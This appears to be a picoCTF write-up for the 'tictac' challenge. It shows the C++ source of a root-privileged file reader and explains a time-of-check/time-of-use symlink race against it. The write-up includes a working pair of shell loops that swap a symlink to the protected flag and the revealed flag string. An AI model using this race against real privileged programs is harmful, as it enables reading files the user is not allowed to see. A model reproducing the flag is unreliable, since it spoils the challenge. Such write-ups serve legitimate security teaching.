# tictac
Points: 200

This challenge provides a ssh shell where the home directory contains three
files, `src.cpp`, `txtreader`, and `flag.txt`. Attempting to cat flag.txt
does not work because we do not have root permissions.

source for `txtreader`:
```cpp
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```

We can see that `txtreader` is a program that only outputs a files contents
if the user running `txtreader` also owns the file it is attempting to read.
Additionally, `txtreader` runs with root permissions.

It is fairly obvious this is a symlink problem, where you infinitely symlink
between a owned flag.txt and the real flag.txt. Then in a separate loop infinitely
run `txtreader` until it outputs the flag. The idea here is that if you do this
enough `txtreader` will access our fake flag file with the first check, but then
output the contents of the real flag file because it was re-symlinked in the middle
of program execution.

```sh
mkdir -p victim/link
cd victim
touch link/flag.txt
printf 'while [ 1 ]\ndo\nln -sf link/flag.txt flag.txt\nln -sf ../flag.txt flag.txt\ndone' > attack.sh
chmod +x ./attack.sh
printf 'while [ 1 ]\ndo\n../txtreader flag.txt\ndone\n' > reader.sh
chmod +x ./reader.sh
./attack.sh &
./reader.sh 2>1 | grep "pico"
```

# Flag: `picoCTF{ToctoU_!s_3a5y_007659c9}`